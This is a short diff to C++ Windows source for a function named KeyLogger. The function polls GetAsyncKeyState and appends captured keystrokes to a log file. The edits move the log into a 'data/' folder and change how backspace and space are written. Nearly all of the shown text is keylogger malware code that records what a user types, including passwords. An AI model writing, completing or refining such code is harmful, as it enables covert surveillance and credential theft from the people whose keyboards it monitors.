@@ -2,7 +2,6 @@
 #include <windows.h>
 #include <winuser.h>
 #include <fstream>
-#include <unistd.h>
 
 void KeyLogger(void)
 {
@@ -31,7 +30,7 @@ void KeyLogger(void)
             {
                 // GetAsyncKeyState checks if a specific key was pressed.
                 // -32767 indicates a key press event.
-                std::ofstream write("Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.
+                std::ofstream write("data/Record.txt", std::ios::app); // ios::app ensures that the file is opened in append mode.
 
                 if (character > 64 && character < 91 && !GetAsyncKeyState(0x10))
                 {
@@ -49,7 +48,7 @@ void KeyLogger(void)
                 {
                     case 8: // 8 means backspace.
                     {
-                        write << " <Backspace> ";
+                        write << "\b";
                     }
                     break;
                     case 13: // 13 is for tthe "Enter Key"
@@ -64,7 +63,7 @@ void KeyLogger(void)
                     break;
                     case 32: // 32 is for the "Space key"
                     {
-                        write << " <Space> ";
+                        write << " ";
                     }
                     break;
                     case 127: // 127 is for the "Delete key"
